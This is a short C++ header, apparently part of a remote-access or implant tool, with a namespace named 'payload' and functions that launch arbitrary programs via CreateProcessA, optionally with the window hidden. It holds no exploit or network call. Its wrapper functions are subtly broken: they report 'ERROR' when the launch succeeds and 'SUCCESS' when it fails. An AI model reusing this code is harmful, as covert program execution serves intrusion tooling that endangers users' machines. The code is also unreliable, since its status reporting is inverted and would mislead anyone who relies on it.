#pragma once
#include "precompile.h"
#include "process.h"

namespace payload {

	bool process_execution(std::string program, bool hide) {
		STARTUPINFOA info = { sizeof(info) };
		PROCESS_INFORMATION process_info;
		info.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
		if (hide) {
			info.wShowWindow = SW_HIDE;
		}
		if (!CreateProcessA(0, (LPSTR)program.c_str(), 0, 0, false, CREATE_NEW_CONSOLE, 0, 0, &info, &process_info))
		{
			return false;
		}
		else {
			CloseHandle(process_info.hProcess);
			CloseHandle(process_info.hThread);
			return true;
		}
	}

	std::string process_execution_hidden(std::string program) {
		if (process_execution(program, true))
		{
			return "ERROR" + std::to_string(GetLastError());
		}
		else {
			return "SUCCESS";
		}
	}

	std::string process_execution_show(std::string program) {
		if (process_execution(program, false))
		{
			return "ERROR" + std::to_string(GetLastError());
		}
		else {
			return "SUCCESS";
		}
	}


}